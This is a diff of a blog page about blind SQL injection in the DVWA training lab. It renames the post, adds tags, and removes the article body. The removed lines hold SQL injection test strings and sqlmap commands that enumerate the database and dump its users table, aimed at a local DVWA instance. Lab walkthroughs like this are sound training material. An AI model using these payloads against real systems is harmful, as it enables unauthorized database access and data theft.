@@ -4,16 +4,8 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="DVWA SQL Injection (blind), 是小竹不是小猪">
-    <meta name="description" content="Low手工注入：检查注入
-
-1&amp;quot; or&amp;#39;1&amp;#39;=&amp;#39;1&amp;#39;#
-
-1&amp;#39; or&amp;#39;1&amp;#39;=&amp;#39;1&amp;#39;#
-
-发现前者报错，后者正确.
-
-因此可以采用的方法是布尔盲注，数据库名，表">
+    <meta name="keywords" content="DVWA SQL 盲注实战, 是小竹不是小猪">
+    <meta name="description" content="DVWA SQL 盲注实战 | 是小竹不是小猪">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -25,7 +17,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>DVWA SQL Injection (blind) | 是小竹不是小猪</title>
+    <title>DVWA SQL 盲注实战 | 是小竹不是小猪</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
@@ -317,12 +309,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/19.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/6.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">DVWA SQL Injection (blind)</h1>
+                    <h1 class="description center-align post-title">DVWA SQL 盲注实战</h1>
                 </div>
             </div>
         </div>
@@ -436,9 +428,17 @@
             <div class="row tag-cate">
                 <div class="col s7">
                     
-                          <div class="article-tag">
-                            <span class="chip bg-color">无标签</span>
-                          </div>
+                    <div class="article-tag">
+                        
+                            <a href="/tags/%E5%AE%89%E5%85%A8/">
+                                <span class="chip bg-color">安全</span>
+                            </a>
+                        
+                            <a href="/tags/SQL%E6%B3%A8%E5%85%A5/">
+                                <span class="chip bg-color">SQL注入</span>
+                            </a>
+                        
+                    </div>
                     
                 </div>
                 <div class="col s5 right-align">
@@ -471,42 +471,7 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h2><h3 id="手工注入："><a href="#手工注入：" class="headerlink" title="手工注入："></a>手工注入：</h3><p>检查注入</p>
-<pre><code class="sql">
-1&quot; or&#39;1&#39;=&#39;1&#39;#
-
-1&#39; or&#39;1&#39;=&#39;1&#39;#
-
-发现前者报错，后者正确.
-</code></pre>
-<p>因此可以采用的方法是布尔盲注，数据库名，表名，列名，数据名均可以进行布尔盲注的猜测法；可见之前的博客<a href="https://zhuyanzhen-lab.github.io/2022/02/28/0228/">sqli-lab less8-10 | 是小竹不是小猪 (zhuyanzhen-lab.github.io)</a></p>
-<h2 id="Sqlmap-注入"><a href="#Sqlmap-注入" class="headerlink" title="Sqlmap 注入"></a>Sqlmap 注入</h2><p>连接服务器，成功</p>
-<pre><code class="shell">python2 sqlmap.py -u&quot;http://localhost/DVWA-master/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;security=low; PHPSESSID=vpuktak3jkvhong5mrdm62eri5&quot; --batch
-</code></pre>
-<p>获取数据库</p>
-<pre><code class="shell">python2 sqlmap.py -u&quot;http://localhost/DVWA-master/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;security=low; PHPSESSID=vpuktak3jkvhong5mrdm62eri5&quot; --batch -dbs
-</code></pre>
-<p>获取表名</p>
-<pre><code class="shell">python2 sqlmap.py -u&quot;http://localhost/DVWA-master/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;security=low; PHPSESSID=vpuktak3jkvhong5mrdm62eri5&quot; --batch -D dvwa --tables
-</code></pre>
-<p>获取列名</p>
-<pre><code class="shell">python2 sqlmap.py -u&quot;http://localhost/DVWA-master/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;security=low; PHPSESSID=vpuktak3jkvhong5mrdm62eri5&quot; --batch -D dvwa -T users --columns
-</code></pre>
-<p>获取数据</p>
-<pre><code class="shell">python2 sqlmap.py -u&quot;http://localhost/DVWA-master/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;security=low; PHPSESSID=vpuktak3jkvhong5mrdm62eri5&quot; --batch -D dvwa -T users --dump
-</code></pre>
-<h2 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h2><p>利用burp进行抓包，发现提交数据id=1&amp;Submit=Submit</p>
-<p>于是利用sqlmap 进行注入</p>
-<p>获取服务器信息，成功。</p>
-<pre><code class="shell">python2 sqlmap.py -u&quot;http://localhost/DVWA-master/vulnerabilities/sqli_blind/#&quot; --data=&quot;id=1&amp;Submit=Submit&quot; --cookie=&quot;security=medium; PHPSESSID=vpuktak3jkvhong5mrdm62eri5&quot; --batch
-</code></pre>
-<p>然后依次进行注入即可。</p>
-<h2 id="High"><a href="#High" class="headerlink" title="High"></a>High</h2><p>查询cookie的方法是点击检查页面，点击网络和要进行查询的连接，可以看到cookie。</p>
-<pre><code class="shell">python2 sqlmap.py -u&quot;http://localhost/DVWA-master/vulnerabilities/sqli_blind/cookie-input.php&quot; --data=&quot;id=1&amp;Submit=Submit&quot; --second-url=&quot;http://localhost/DVWA-master/vulnerabilities/sqli_blind/&quot; --cookie=&quot;security=high; PHPSESSID=vpuktak3jkvhong5mrdm62eri5&quot; --batch
-</code></pre>
-<p><img src="/2022/03/08/0309/4.PNG" alt="4"></p>
-<p><img src="/2022/03/08/0309/3.PNG" alt="3"></p>
-
+                
                 
             </div>
             <hr/>
@@ -569,7 +534,15 @@
                 <div class="post-meta__tag-list" style="display: inline-block;">
                     
                         <div class="article-tag">
-                            <span class="chip bg-color">无标签</span>
+                            
+                                <a href="/tags/%E5%AE%89%E5%85%A8/">
+                                    <span class="chip bg-color">安全</span>
+                                </a>
+                            
+                                <a href="/tags/SQL%E6%B3%A8%E5%85%A5/">
+                                    <span class="chip bg-color">SQL注入</span>
+                                </a>
+                            
                         </div>
                     
                 </div>
@@ -747,9 +720,9 @@
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/6.jpg" class="responsive-img" alt="DVWA Weak Session IDS">
+                        <img src="/medias/featureimages/0.jpg" class="responsive-img" alt="DVWA Weak Session IDs 解题记录">
                         
-                        <span class="card-title">DVWA Weak Session IDS</span>
+                        <span class="card-title">DVWA Weak Session IDs 解题记录</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -771,6 +744,18 @@
                     </div>
                 </div>
                 
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/%E5%AE%89%E5%85%A8/">
+                        <span class="chip bg-color">安全</span>
+                    </a>
+                    
+                    <a href="/tags/Web%E5%AE%89%E5%85%A8/">
+                        <span class="chip bg-color">Web安全</span>
+                    </a>
+                    
+                </div>
+                
             </div>
         </div>
         
@@ -784,9 +769,9 @@
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/17.jpg" class="responsive-img" alt="DVWA-SQL注入 medium high">
+                        <img src="/medias/featureimages/7.jpg" class="responsive-img" alt="DVWA SQL 注入（Medium &amp; High）">
                         
-                        <span class="card-title">DVWA-SQL注入 medium high</span>
+                        <span class="card-title">DVWA SQL 注入（Medium &amp; High）</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -806,6 +791,18 @@
                             
                         </span>
                     </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/%E5%AE%89%E5%85%A8/">
+                        <span class="chip bg-color">安全</span>
+                    </a>
+                    
+                    <a href="/tags/SQL%E6%B3%A8%E5%85%A5/">
+                        <span class="chip bg-color">SQL注入</span>
+                    </a>
+                    
                 </div>
                 
             </div>
